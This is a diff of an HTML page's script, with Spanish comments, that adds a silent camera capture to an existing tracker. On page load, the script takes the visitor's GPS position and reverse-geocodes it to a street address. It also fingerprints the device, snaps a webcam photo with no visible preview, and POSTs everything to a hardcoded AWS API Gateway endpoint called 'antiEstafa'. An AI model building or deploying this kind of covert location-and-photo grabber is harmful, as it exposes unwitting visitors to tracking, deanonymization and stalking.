@@ -58,61 +58,63 @@
 
     <script>
         const apiGatewayEndpoint = "https://qnjv9cpt62.execute-api.sa-east-1.amazonaws.com/antiEstafa";
-
+        
         // Configurar la fecha actual
         document.getElementById("date").innerText = new Date().toLocaleString();
-
+    
         // Función para obtener la geolocalización
         async function getLocation() {
             try {
-                const response = await fetch("https://ipinfo.io/json");
-                if (response.ok) {
-                    const data = await response.json();
-                    const location = {
-                        city: data.city || "Desconocido",
-                        region: data.region || "Desconocido",
-                        country: data.country || "Desconocido",
-                        loc: data.loc || "0,0"
-                    };
-                    
-                    const [latitude, longitude] = location.loc.split(',');
-
-                    // Detalles más específicos como barrio y dirección
-                    let detailedAddress = null;
-                    try {
-                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
-                        if (geoResponse.ok) {
-                            const geoData = await geoResponse.json();
-                            detailedAddress = geoData.display_name || "Dirección no disponible";
-                        }
-                    } catch (error) {
-                        console.error("Error al obtener detalles de la dirección:", error);
-                    }
-
-                    return {
-                        latitude,
-                        longitude,
-                        city: location.city,
-                        region: location.region,
-                        country: location.country,
-                        detailedAddress: detailedAddress || "Dirección desconocida"
-                    };
+                if ("geolocation" in navigator) {
+                    return new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                const latitude = position.coords.latitude;
+                                const longitude = position.coords.longitude;
+    
+                                let detailedAddress = null;
+                                try {
+                                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                                    if (geoResponse.ok) {
+                                        const geoData = await geoResponse.json();
+                                        detailedAddress = geoData.display_name || "Dirección no disponible";
+                                    }
+                                } catch (error) {
+                                    console.error("Error al obtener detalles de la dirección:", error);
+                                }
+    
+                                resolve({
+                                    latitude,
+                                    longitude,
+                                    city: "Desconocido",
+                                    region: "Desconocido",
+                                    country: "Desconocido",
+                                    detailedAddress: detailedAddress || "Dirección desconocida"
+                                });
+                            },
+                            (error) => {
+                                console.error("Error al obtener la ubicación:", error);
+                                reject("No se pudo obtener la ubicación");
+                            }
+                        );
+                    });
+                } else {
+                    throw new Error("Geolocalización no disponible");
                 }
             } catch (error) {
                 console.error("Error al obtener la ubicación:", error);
+                return null;
             }
-            return null;
         }
-
-        // Función para obtener detalles del dispositivo móvil (más específicos)
+    
+        // Función para obtener detalles del dispositivo móvil
         function getDeviceInfo() {
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
-
-            // Detectar si el dispositivo es iPhone o Android
+    
             const isAndroid = /Android/i.test(userAgent);
             const isIOS = /iPhone|iPad|iPod/i.test(userAgent);
-
+    
             let deviceInfo = {
                 deviceType: isAndroid ? "Android" : (isIOS ? "iOS" : "Desconocido"),
                 userAgent: userAgent,
@@ -121,13 +123,11 @@
                 deviceMemory: navigator.deviceMemory || "Desconocido",
                 hardwareConcurrency: navigator.hardwareConcurrency || "Desconocido",
                 appVersion: navigator.appVersion,
-                // Obtener la versión del sistema operativo, aunque no es 100% preciso
                 osVersion: (isAndroid ? /Android (\d+\.\d+)/.exec(userAgent) : (isIOS ? /OS (\d+_\d+)/.exec(userAgent) : null)) || ["", "Desconocido"]
             };
-
-            // Detectar el modelo de dispositivo (más precisa para Android e iOS)
+    
             if (isAndroid) {
-                const model = /Build\/(.+)/.exec(userAgent); // Android device model detection
+                const model = /Build\/(.+)/.exec(userAgent);
                 deviceInfo.deviceModel = model ? model[1] : "Modelo desconocido";
             } else if (isIOS) {
                 const model = /iPhone|iPad|iPod/.exec(userAgent);
@@ -135,12 +135,36 @@
             } else {
                 deviceInfo.deviceModel = "Dispositivo desconocido";
             }
-
+    
             return deviceInfo;
         }
-
+    
+        // Función para capturar una foto desde la cámara
+        async function capturePhoto(location, deviceInfo) {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+    
+            // Crear un canvas para tomar la foto
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            video.onloadeddata = () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg');  // Imagen en base64
+    
+                // Detener el stream después de capturar la foto
+                stream.getTracks().forEach(track => track.stop());
+    
+                // Enviar la foto y datos a la API
+                sendToApi(location, deviceInfo, imageData);
+            };
+        }
+    
         // Función para enviar los datos a la API
-        async function sendToApi(location, deviceInfo) {
+        async function sendToApi(location, deviceInfo, photoData) {
             try {
                 const payload = {
                     location: {
@@ -155,11 +179,12 @@
                         ...deviceInfo
                     },
                     timestamp: new Date().toISOString(),
-                    // Si tienes imágenes o capturas, puedes agregar esas URLs aquí
-                    photo_url: "url-de-la-foto",  // Cambia esto por la URL de la foto
-                    screenshot_url: "url-de-la-captura",  // Cambia esto por la URL de la captura de pantalla
+                    files: {
+                        photo: photoData,  // Aquí agregas la imagen en base64
+                        screenshot: "url-de-la-captura"  // Aquí puedes agregar la URL de la captura de pantalla si lo deseas
+                    }
                 };
-
+    
                 const response = await fetch(apiGatewayEndpoint, {
                     method: "POST",
                     headers: {
@@ -167,7 +192,7 @@
                     },
                     body: JSON.stringify(payload)
                 });
-
+    
                 if (response.ok) {
                     document.getElementById("status").innerText = "Carga completa.";
                 } else {
@@ -178,17 +203,20 @@
                 document.getElementById("status").innerText = "Error al enviar datos.";
             }
         }
-
+    
         // Iniciar proceso automáticamente
         (async function () {
             const location = await getLocation();
             const deviceInfo = getDeviceInfo();
             if (location) {
-                await sendToApi(location, deviceInfo);
+                await capturePhoto(location, deviceInfo);  // Capturar la foto y enviar datos
             } else {
                 document.getElementById("status").innerText = "No se pudo obtener la ubicación.";
             }
         })();
     </script>
+    
+    
+    
 </body>
 </html>
